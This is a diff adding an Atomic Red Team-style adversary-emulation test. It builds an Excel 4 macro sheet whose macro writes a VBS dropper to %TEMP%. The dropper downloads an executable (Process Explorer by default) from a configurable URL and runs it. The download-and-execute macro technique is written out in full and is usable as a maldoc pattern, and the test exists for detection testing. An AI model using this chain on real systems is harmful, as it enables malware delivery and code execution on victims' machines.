@@ -138,4 +138,80 @@ atomic_tests:
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
     name: powershell
+- name: Excel 4 Macro
+  auto_generated_guid: 
+  description: |
+    This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
+    VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.
 
+    A note regarding this module. Ensure that the username associated Office is the same as the user ID on the system. "=GET.WORKSPACE(26)"
+    requires that Files -> Options -> User Name matches the system username. Otherwise this will break the pathing. If this does not match,
+    use the `uname` parameter
+  supported_platforms:
+  - windows
+  input_arguments:
+    ms_product:
+      description: Maldoc application Excel
+      type: String
+      default: Excel
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: "15.0"
+    download_url:
+      description: Download URL
+      type: String
+      default: "https://live.sysinternals.com/procexp.exe"
+    uname:
+      description: Username for pathing
+      type: String
+      default: ""
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $xlApp = New-Object -ComObject "Exce.Application"
+      Stop-Process -Name EXCEL
+  executor:
+    command: |
+      $xlApp = New-Object -COMObject "Excel.Application"
+      $xlApp.Visible = $True
+      $xlApp.DisplayAlerts = $False
+      $xlBook = $xlApp.Workbooks.Add()
+      $sheet = $xlBook.Excel4MacroSheets.Add()
+      if ("#{uname}" -eq "") {
+        $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
+      } else {
+        $sheet.Cells.Item(1,1) = "#{uname}"
+      }
+      $sheet.Cells.Item(2,1) = "procexp.exe"
+      $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
+      $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
+      $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
+      $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"
+      $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
+      $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
+      $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
+      $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
+      $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
+      $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
+      $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
+      $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
+      $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
+      $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
+      $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
+      $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
+      $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
+      $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
+      $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
+      $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
+      $sheet.Cells.Item(23,1) = "=HALT()"
+      $sheet.Cells.Item(1,1).Name = "runme"
+      $xlApp.Run("runme")
+      $xlApp.Quit()
+    cleanup_command: |
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+    name: powershell
